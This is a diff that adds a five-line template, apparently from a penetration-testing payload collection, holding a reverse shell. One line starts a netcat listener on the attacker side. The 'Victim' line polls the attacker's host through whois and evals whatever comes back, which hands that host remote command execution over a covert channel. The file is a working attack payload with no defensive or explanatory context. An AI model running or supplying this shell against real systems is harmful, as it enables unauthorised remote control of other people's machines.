@@ -1,0 +1,5 @@
+# desc: Attacker
+while true; do nc -l #{LPORT}; done
+
+# desc: Victim
+export X=Connected; while true; do X=`eval $(whois -h #{LHOST} -p #{LPORT} "Output: $X")`; sleep 1; done
